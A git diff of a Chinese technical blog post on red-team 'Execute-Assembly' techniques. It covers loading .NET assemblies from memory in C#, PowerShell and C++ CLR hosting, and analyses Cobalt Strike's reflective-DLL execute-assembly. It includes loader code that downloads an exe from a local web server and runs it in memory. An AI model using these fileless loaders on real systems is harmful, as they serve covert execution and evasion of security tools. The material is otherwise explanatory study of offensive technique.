@@ -6,24 +6,26 @@ star: "1"
 sticky: "1"
 ---
 
-# Execute-Assembly实现方法
+# Execute-Assembly 实现方法
+
+这里记录 Execute-Assembly 实现方法，包括
+
+- 执行本地 exe
+- 从内存中加载.NET 程序集
+
+参考 [Execute-Assembly 实现 | idiotc4t's blog](https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization)
 
 文档里的代码都[DailyCode/PEExecute at main · echo0d/DailyCode](https://github.com/echo0d/DailyCode/tree/main/ExecuteAssembly)
 
-> * 执行本地exe
-> * 从内存中加载.NET程序集
->   * C#
->   * C++
->
-> [Execute-Assembly实现 | idiotc4t's blog](https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization)
+<!-- more -->
 
 ## 0. 执行本地文件
 
-此处以C# C++ Java为例：AI都会写
+此处以 C# C++ Java 为例：AI 都会写
 
 ### exe
 
-在C#中执行一个`.exe`文件可以使用`Process`类，
+在 C#中执行一个`.exe`文件可以使用`Process`类，
 
 ```csharp
 using System;
@@ -38,7 +40,7 @@ class Program
 }
 ```
 
-而在C++中可以使用`CreateProcess`函数。
+而在 C++中可以使用`CreateProcess`函数。
 
 ```cpp
 #include <windows.h>
@@ -90,11 +92,9 @@ public void exeExecute(String filePath) {
     }
 ```
 
-
-
 ### dll
 
-在C#中执行一个`.dll`文件通常涉及在应用程序中加载并调用该`.dll`中的函数。
+在 C#中执行一个`.dll`文件通常涉及在应用程序中加载并调用该`.dll`中的函数。
 
 ```csharp
 using System;
@@ -112,7 +112,7 @@ class Program
 }
 ```
 
-在C++中执行一个`.dll`文件通常是通过加载动态链接库并调用其中的函数。
+在 C++中执行一个`.dll`文件通常是通过加载动态链接库并调用其中的函数。
 
 ```cpp
 #include <windows.h>
@@ -144,33 +144,27 @@ int main()
 }
 ```
 
-Java调用第三方dll有点困难，需要dll的源码中实现了JNI方法，此处就不写了。
+Java 调用第三方 dll 有点困难，需要 dll 的源码中实现了 JNI 方法，此处就不写了。
 
-
-
-
-
-## 1. managed代码内存加载.NET程序集
+## 1. managed 代码内存加载.NET 程序集
 
 **(Assembly.Load)**
 
-使用C#从内存中加载.NET程序集，直接用`Assembly.Load`就行了。
+使用 C#从内存中加载.NET 程序集，直接用`Assembly.Load`就行了。
 
-> [从内存加载.NET程序集(Assembly.Load)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
+> [从内存加载.NET 程序集(Assembly.Load)的利用分析](<https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90>)
 >
 > [Assembly.Load Method (System.Reflection) | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5)
 
-
-
-### 1.1. 三种Load的区别
+### 1.1. 三种 Load 的区别
 
 **`Assembly.Load()`、`Assembly.LoadFrom()`和`Assembly.LoadFile()`**
 
-* `Assembly.Load()`是从String或AssemblyName类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘
+- `Assembly.Load()`是从 String 或 AssemblyName 类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘
 
-* `Assembly.LoadFrom()`从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集，例如：`Assembly.LoadFrom("a.dll")`，如果a.dll中引用了b.dll，那么会同时加载a.dll和b.dll
+- `Assembly.LoadFrom()`从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集，例如：`Assembly.LoadFrom("a.dll")`，如果 a.dll 中引用了 b.dll，那么会同时加载 a.dll 和 b.dll
 
-* `Assembly.LoadFile()`也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集，例如：`Assembly.LoadFile("a.dll")`，如果a.dll中引用了b.dll，那么不会加载b.dll
+- `Assembly.LoadFile()`也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集，例如：`Assembly.LoadFile("a.dll")`，如果 a.dll 中引用了 b.dll，那么不会加载 b.dll
 
 ### 1.2. C#反射加载流程
 
@@ -199,17 +193,17 @@ namespace TestApplication
 }
 ```
 
-使用csc.exe进行编译：
+使用 csc.exe 进行编译：
 
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:testcalc.exe test.cs
 ```
 
-生成testcalc.exe
+生成 testcalc.exe
 
-#### 方法1
+#### 方法 1
 
-**（1）测试的.exe作base64编码**
+**（1）测试的.exe 作 base64 编码**
 
 代码如下：
 
@@ -231,7 +225,7 @@ namespace TestApplication
 }
 ```
 
-**（2）还原.exe的内容**
+**（2）还原.exe 的内容**
 
 ```csharp
 using System;
@@ -248,9 +242,7 @@ namespace TestApplication
 
 ```
 
-
-
-**（3）使用Assembly.Load()加载程序集并调用方法**
+**（3）使用 Assembly.Load()加载程序集并调用方法**
 
 代码如下：
 
@@ -267,17 +259,17 @@ namespace TestApplication
             string base64str = "egrdersg";//这里省略一下
             byte[] buffer = Convert.FromBase64String(base64str);
 
-            Assembly assembly = Assembly.Load(buffer);          
+            Assembly assembly = Assembly.Load(buffer);
             Type type = assembly.GetType("TestApplication.aaa");
             MethodInfo method = type.GetMethod("bbb");
-            Object obj = assembly.CreateInstance(method.Name);            
+            Object obj = assembly.CreateInstance(method.Name);
             method.Invoke(obj, null);
         }
     }
 }
 ```
 
-如果不需要指定需要调用的方法，调用main函数即可：
+如果不需要指定需要调用的方法，调用 main 函数即可：
 
 ```csharp
 using System;
@@ -305,7 +297,7 @@ namespace TestApplication
 }
 ```
 
-#### 方法2
+#### 方法 2
 
 远程下载
 
@@ -320,32 +312,30 @@ namespace TestApplication
 
             // 方法2. 远程下载exe，赋值给一个字符串类型的变量
             byte[] buffer = GetRemoteByte("http://127.0.0.1:8000/testcalc.exe");
-            
+
             Assembly assembly = Assembly.Load(buffer);
             MethodInfo method = assembly.EntryPoint;
             method.Invoke(null, null);
         }
-        
-        
+
+
         private static byte[] GetRemoteByte(string serviceUrl)
         {
             WebClient client = new WebClient();
             byte[] buffer = client.DownloadData(serviceUrl);
             return buffer;
         }
-        
+
     }
 ```
-
-
 
 ### 1.3. powershell
 
 > https://idiotc4t.com/code-and-dll-process-injection/.net-fan-she-jia-zai
 
-powershell访问.net程序集的代码比较简单
+powershell 访问.net 程序集的代码比较简单
 
-1. 把代码写进ps1脚本里
+1. 把代码写进 ps1 脚本里
 
 ```powershell
 # 把代码写进ps1脚本里
@@ -375,7 +365,7 @@ Add-Type -ReferencedAssemblies $Assemblies -TypeDefinition $Source -Language CSh
 [TestApplication.Program]::Main()
 ```
 
-2. base64编码的字符串
+2. base64 编码的字符串
 
 ```powershell
 # base64编码的字符串
@@ -402,54 +392,52 @@ $invoke2 = [System.Reflection.Assembly]::UnsafeLoadFrom("http://127.0.0.1:8000/t
 $invoke2.EntryPoint.Invoke($null,$null)
 ```
 
-
-
-## 2. unmanaged代码内存加载.NET程序集
+## 2. unmanaged 代码内存加载.NET 程序集
 
 **(execute-assembly)**
 
-当不是用C#编写代码，但还是想要实现上面的操作时，例如Cobalt Strike 3.11中，加入了一个名为”execute-assembly”的命令，能够从内存中加载.NET程序集。`execute-assembly`功能的实现，必须使用一些来自.NET Framework的核心接口来执行.NET程序集口
+当不是用 C#编写代码，但还是想要实现上面的操作时，例如 Cobalt Strike 3.11 中，加入了一个名为”execute-assembly”的命令，能够从内存中加载.NET 程序集。`execute-assembly`功能的实现，必须使用一些来自.NET Framework 的核心接口来执行.NET 程序集口
 
 ### 2.1. CLR
 
-CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境，是.NET Framework的主要执行引擎，作用之一是监视程序的运行：（或者说相当于Java中的JVM）
+CLR 全称 Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境，是.NET Framework 的主要执行引擎，作用之一是监视程序的运行：（或者说相当于 Java 中的 JVM）
 
-- 在CLR监视之下运行的程序属于”托管的”(managed)代码
-- 不在CLR之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码
+- 在 CLR 监视之下运行的程序属于”托管的”(managed)代码
+- 不在 CLR 之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码
 
-**Hosting** (Unmanaged API Reference) 用于将.NET 程序集加载到任意程序中的API（https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/ ）本次主要关注两种方式，按照.net版本区分：
+**Hosting** (Unmanaged API Reference) 用于将.NET 程序集加载到任意程序中的 API（https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/ ）本次主要关注两种方式，按照.net 版本区分：
 
 - **ICorRuntimeHost Interface**：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/icorruntimehost-interface
 
-  支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319
+  支持 v1.0.3705, v1.1.4322, v2.0.50727 和 v4.0.30319
 
 - **ICLRRuntimeHost Interface**：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface
 
-  支持v2.0.50727和v4.0.30319，在.NET Framework 2.0中，ICLRRuntimeHost用于取代ICorRuntimeHost，在实际程序开发中，很少会考虑.NET Framework 1.0，所以两个接口都可以使用
+  支持 v2.0.50727 和 v4.0.30319，在.NET Framework 2.0 中，ICLRRuntimeHost 用于取代 ICorRuntimeHost，在实际程序开发中，很少会考虑.NET Framework 1.0，所以两个接口都可以使用
 
-下面选择ICLRRuntimeHost介绍：`ICLRRuntimeHost`、`ICLRRuntimeInfo` 以及`ICLRMetaHost` 接口
+下面选择 ICLRRuntimeHost 介绍：`ICLRRuntimeHost`、`ICLRRuntimeInfo` 以及`ICLRMetaHost` 接口
 
 [ICLRRuntimeHost Interface - .NET Framework | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface)
 
-- **ICLRMetaHost**: 这个接口用于在托管代码中获取关于加载的CLR（Common Language Runtime，.NET Framework的核心组件）的信息。基本上，它提供了一个入口点，允许我们枚举加载到进程中的所有CLR版本，并为特定版本的CLR获取`ICLRRuntimeInfo`接口。
-- **ICLRRuntimeInfo**: 一旦你有了表示特定CLR版本的`ICLRRuntimeInfo`接口，你可以用它来获取CLR运行时的其他接口，例如`ICLRRuntimeHost`。这个接口还允许你判断这个特定版本的CLR是否已经被加载到进程中。
-- **ICLRRuntimeHost**: 这是执行.NET程序集所必需的主要接口。通过这个接口，你可以启动托管代码的执行环境，加载.NET程序集，并执行它。具体来说，它的`ExecuteInDefaultAppDomain`方法可以用来加载和执行.NET程序集。
+- **ICLRMetaHost**: 这个接口用于在托管代码中获取关于加载的 CLR（Common Language Runtime，.NET Framework 的核心组件）的信息。基本上，它提供了一个入口点，允许我们枚举加载到进程中的所有 CLR 版本，并为特定版本的 CLR 获取`ICLRRuntimeInfo`接口。
+- **ICLRRuntimeInfo**: 一旦你有了表示特定 CLR 版本的`ICLRRuntimeInfo`接口，你可以用它来获取 CLR 运行时的其他接口，例如`ICLRRuntimeHost`。这个接口还允许你判断这个特定版本的 CLR 是否已经被加载到进程中。
+- **ICLRRuntimeHost**: 这是执行.NET 程序集所必需的主要接口。通过这个接口，你可以启动托管代码的执行环境，加载.NET 程序集，并执行它。具体来说，它的`ExecuteInDefaultAppDomain`方法可以用来加载和执行.NET 程序集。
 
-综上所述，要在非托管代码（如C++）中执行.NET程序集，你需要首先使用`ICLRMetaHost`来确定哪个CLR版本已加载或可用。然后使用`ICLRRuntimeInfo`来为这个CLR版本获取`ICLRRuntimeHost`。最后用`ICLRRuntimeHost`来加载和执行.NET程序集。
+综上所述，要在非托管代码（如 C++）中执行.NET 程序集，你需要首先使用`ICLRMetaHost`来确定哪个 CLR 版本已加载或可用。然后使用`ICLRRuntimeInfo`来为这个 CLR 版本获取`ICLRRuntimeHost`。最后用`ICLRRuntimeHost`来加载和执行.NET 程序集。
 
-### 2.2. Cobalt Strike execute-assembly流程
+### 2.2. Cobalt Strike execute-assembly 流程
 
-> [.net程序集内存加载执行技术 | 0pen1的博客](https://0pen1.github.io/2022/02/09/net程序集内存加载执行技术/)
+> [.net 程序集内存加载执行技术 | 0pen1 的博客](https://0pen1.github.io/2022/02/09/net程序集内存加载执行技术/)
 
-在Cobalt Strike的代码中找到BeaconConsole.java文件，定位到“execute-assembly”命令处。通过简单分析这段代码可以知道，当解析到用户执行“execute-assembly”命令后，会先验证”pZ“和”F“关键字来判断要执行的.net程序集是否带有参数（具体如何判断请查看CommandParser类）。判断完成使用CommandParser类的popstring方法将execute-assembly的参数赋值给变量，然后调用ExecuteAssembly方法执行程序集。
+在 Cobalt Strike 的代码中找到 BeaconConsole.java 文件，定位到“execute-assembly”命令处。通过简单分析这段代码可以知道，当解析到用户执行“execute-assembly”命令后，会先验证”pZ“和”F“关键字来判断要执行的.net 程序集是否带有参数（具体如何判断请查看 CommandParser 类）。判断完成使用 CommandParser 类的 popstring 方法将 execute-assembly 的参数赋值给变量，然后调用 ExecuteAssembly 方法执行程序集。
 
 ![image-20220114182430780](img/ExecuteAssembly/image-20220114182430780-16443915545351.png)
 
-我们继续跟进ExecuteAssembly方法，ExecuteAssembly方法有两个参数，第一个参数为待执行的.net程序集路径，第二个参数为.net程序集执行需要的参数。执行这个方法时先将要执行的.net程序集从硬盘读取并加载到PE解析器（PEParser）中，随后判断加载的PE文件是否为.net程序集，如果是.net程序集则创建ExecuteAssemblyJob实例并调用spawn方法。
+我们继续跟进 ExecuteAssembly 方法，ExecuteAssembly 方法有两个参数，第一个参数为待执行的.net 程序集路径，第二个参数为.net 程序集执行需要的参数。执行这个方法时先将要执行的.net 程序集从硬盘读取并加载到 PE 解析器（PEParser）中，随后判断加载的 PE 文件是否为.net 程序集，如果是.net 程序集则创建 ExecuteAssemblyJob 实例并调用 spawn 方法。
 
 ![image-20220114182256752](img/ExecuteAssembly/image-20220114182256752.png)
 
-接下来进入spawn方法，可以看到是**通过反射DLL的方法，将invokeassembly.dll注入到进程当中**（这块还没自己实现过），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。
+接下来进入 spawn 方法，可以看到是**通过反射 DLL 的方法，将 invokeassembly.dll 注入到进程当中**（这块还没自己实现过），并且设置任务号为 70（x86 版本）或者 71（x64）。注入的 invokeassembly.dll 在其内存中创建 CLR 环境，然后通过管道再将 C#可执行文件读取到内存中,最后执行。
 
 ```java
 public void spawn(String var1) {
@@ -494,27 +482,25 @@ public void spawn(String var1) {
 
 ![image-20220117192352767](img/ExecuteAssembly/image-20220117192352767.png)
 
+**总结一下**，Cobalt Strike 内存加载执行.net 程序集大概的过程就是，首先 spawn 一个进程并传输 invokeassembly.dll 注入到该进程，invokeassembly.dll 实现了在其内存中创建 CLR 环境，然后通过管道再将 C#可执行文件读取到内存中,最后执行。
 
+**那么 invokeassembly.dll 内部是如何操作的呢？**
 
-**总结一下**，Cobalt Strike内存加载执行.net程序集大概的过程就是，首先spawn一个进程并传输invokeassembly.dll注入到该进程，invokeassembly.dll实现了在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。
+TODO:反射 dll 注入
 
-**那么invokeassembly.dll内部是如何操作的呢？**
-
-TODO:反射dll注入
-
-### 2.3. 硬盘加载执行.NET程序集
+### 2.3. 硬盘加载执行.NET 程序集
 
 #### 过程
 
-1. 初始化ICLRMetaHost接口。
+1. 初始化 ICLRMetaHost 接口。
 
-2. 通过ICLRMetaHost获取ICLRRuntimeInfo接口。
+2. 通过 ICLRMetaHost 获取 ICLRRuntimeInfo 接口。
 
-3. 通过ICLRRuntimeInfo将 CLR 加载到当前进程并返回运行时接口ICLRRuntimeHost指针。
+3. 通过 ICLRRuntimeInfo 将 CLR 加载到当前进程并返回运行时接口 ICLRRuntimeHost 指针。
 
-4. 通过ICLRRuntimeHost.Start()初始化CLR。
+4. 通过 ICLRRuntimeHost.Start()初始化 CLR。
 
-5. 通过ICLRRuntimeHost.ExecuteInDefaultAppDomain执行指定程序集(硬盘上)。
+5. 通过 ICLRRuntimeHost.ExecuteInDefaultAppDomain 执行指定程序集(硬盘上)。
 
    [ICLRRuntimeHost::ExecuteInDefaultAppDomain 方法 - .NET Framework | Microsoft Learn](https://learn.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-executeindefaultappdomain-method)
 
@@ -529,8 +515,6 @@ TODO:反射dll注入
 		L"HELLO!",// 参数  // 此处不知道咋能不输入参数，？
 		&dwRet);
 ```
-
-
 
 #### 示例代码
 
@@ -592,7 +576,7 @@ cleanup:
 }
 ```
 
-执行的C#源码
+执行的 C#源码
 
 ```csharp
 using System;
@@ -621,22 +605,22 @@ namespace loadCalc
 
 ![image-20241210102855805](img/ExecuteAssembly/image-20241210102855805.png)
 
-### 2.4. 内存加载执行.NET程序集
+### 2.4. 内存加载执行.NET 程序集
 
 > [med0x2e/ExecuteAssembly: Load/Inject .NET assemblies by; reusing the host (spawnto) process loaded CLR AppDomainManager, Stomping Loader/.NET assembly PE DOS headers, Unlinking .NET related modules, bypassing ETW+AMSI, avoiding EDR hooks via NT static syscalls (x64) and hiding imports by dynamically resolving APIs (hash).](https://github.com/med0x2e/ExecuteAssembly)
 
 #### 过程
 
-1. 初始化CLR环境(同上)
+1. 初始化 CLR 环境(同上)
 
-2. 通过ICLRRuntimeHost获取AppDomain接口指针，然后通过AppDomain接口的QueryInterface方法来查询默认应用程序域的实例指针。
+2. 通过 ICLRRuntimeHost 获取 AppDomain 接口指针，然后通过 AppDomain 接口的 QueryInterface 方法来查询默认应用程序域的实例指针。
 
 ```cpp
 	iRuntimeHost->GetDefaultDomain(&pAppDomain);
 	pAppDomain->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
 ```
 
-3. 通过默认应用程序域实例的Load_3方法加载安全.net程序集数组，并返回Assembly的实例对象指针，通过Assembly实例对象的get_EntryPoint方法获取描述入口点的MethodInfo实例对象。
+3. 通过默认应用程序域实例的 Load_3 方法加载安全.net 程序集数组，并返回 Assembly 的实例对象指针，通过 Assembly 实例对象的 get_EntryPoint 方法获取描述入口点的 MethodInfo 实例对象。
 
 ```cpp
 	saBound[0].cElements = ASSEMBLY_LENGTH;
@@ -674,7 +658,7 @@ ZeroMemory(&vRet, sizeof(VARIANT));
 	}
 ```
 
-5. 通过描述入口点的MethodInfo实例对象的Invoke方法执行入口点。
+5. 通过描述入口点的 MethodInfo 实例对象的 Invoke 方法执行入口点。
 
 ```cpp
 HRESULT hr = pMethodInfo->Invoke_3(vObj, args, &vRet);
@@ -773,7 +757,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 ```
 
-执行的C#源码
+执行的 C#源码
 
 ```csharp
 using System;
@@ -794,10 +778,3 @@ namespace TEST
     }
 }
 ```
-
-
-
-
-
-
-
